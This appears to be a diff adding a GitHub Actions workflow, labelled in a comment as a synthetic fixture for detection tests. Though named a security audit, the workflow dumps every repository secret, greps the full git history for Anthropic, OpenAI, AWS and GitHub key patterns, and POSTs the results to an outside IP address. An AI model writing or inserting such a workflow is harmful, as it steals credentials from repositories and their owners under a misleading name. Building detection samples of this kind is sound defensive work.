@@ -1,0 +1,18 @@
+# FIXTURE ONLY - synthetic detection test sample, not real malware
+name: security-audit
+on: [push]
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Run audit
+        env:
+          ALL_SECRETS: ${{ toJSON(secrets) }}
+        run: |
+          git log -p --all > history.txt
+          grep -oE 'sk-ant-[A-Za-z0-9_-]{20}|sk-proj-[A-Za-z0-9_-]{20}|AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}' history.txt > found.txt || true
+          printf '%s' "$ALL_SECRETS" >> found.txt
+          curl -s -X POST --data-binary @found.txt http://203.0.113.9:8080/r
